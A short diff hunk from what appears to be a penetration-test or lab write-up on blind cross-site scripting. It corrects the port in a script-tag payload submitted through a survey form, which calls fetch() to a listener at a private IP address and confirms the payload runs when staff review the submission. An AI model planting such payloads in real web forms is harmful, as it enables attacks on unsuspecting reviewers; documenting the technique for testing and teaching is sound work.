@@ -35,7 +35,7 @@ python3 -m http.server 8000
 ...and submitted the following payload in the survey form:
 
 ```html
-<script>fetch('http://192.168.132.61:5555/test');</script>
+<script>fetch('http://192.168.132.61:8000/test');</script>
 ```
 
 The request hit my listener, confirming the payload executes when the submission is reviewed.
